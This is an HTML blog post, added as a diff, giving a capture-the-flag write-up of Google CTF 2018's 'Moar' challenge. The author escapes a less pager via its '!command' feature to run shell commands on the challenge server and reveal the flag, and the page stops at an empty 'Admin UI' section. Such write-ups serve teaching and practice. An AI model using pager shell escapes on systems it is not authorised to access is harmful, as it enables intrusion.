@@ -1,0 +1,72 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="jspenguin2017" />
+
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self';" />
+    <meta name="referrer" content="no-referrer" />
+    <title>Time For Moar Google CTF 2018 - Hugo Xu</title>
+
+    <link rel="stylesheet" href="common.css" />
+    <link rel="stylesheet" href="page.css" />
+</head>
+<body>
+    <div class="navbar">
+        <div class="left">
+            <a class="title">Hugo Xu</a>
+            <a class="item" href="index.html">Home</a>
+        </div>
+        <div class="clear"></div>
+    </div>
+
+    <div class="container"><h1 id="timeformoargooglectf2018">Time For Moar Google CTF 2018</h1>
+<p><a href="Google_CTF_2018_1.html">Last time</a>, I explored the first five quests of Google
+CTF 2018, and now, it's time for MOAR!</p>
+<h2 id="moar">Moar</h2>
+<p>The quest prompt gave a <code>netcat</code> address, let's connect and see what's over on
+the other side:</p>
+<pre><code>$ nc moar.ctfcompetition.com 1337
+[...]
+NAME
+       socat - Multipurpose relay (SOcket CAT)
+
+SYNOPSIS
+       socat [options] &lt;address&gt; &lt;address&gt;
+       socat -V
+       socat -h[h[h]] | -?[?[?]]
+       filan
+       procan
+[...]
+</code></pre>
+<p>It is a <code>man</code> page for <code>socat</code>, over the pager <code>less</code>. Tying <code>q</code> would drop the
+connection. Let's check the help page:</p>
+<pre><code>[...]
+  !command             Execute the shell command with $SHELL.
+  |Xcommand            Pipe file between current pos &amp; mark X to shell command.
+[...]
+</code></pre>
+<p>Oh, that looks interesting, let's try it:</p>
+<pre><code>$ nc moar.ctfcompetition.com 1337
+! ls /
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+! ls ~
+ls: cannot access '/home/unprivileged': No such file or directory
+! ls /home
+moar
+! ls /home/moar
+disable_dmz.sh
+! /home/moar/disable_dmz.sh
+Disabling DMZ using password CTF{SOmething-CATastr0phic}
+/home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
+</code></pre>
+<p>And there is the flag.</p>
+<h2 id="adminui">Admin UI</h2></div>
+
+    <div class="container footer">
+        <p>By Hugo Xu (@jspenguin2017)</p>
+    </div>
+</body>
+</html>
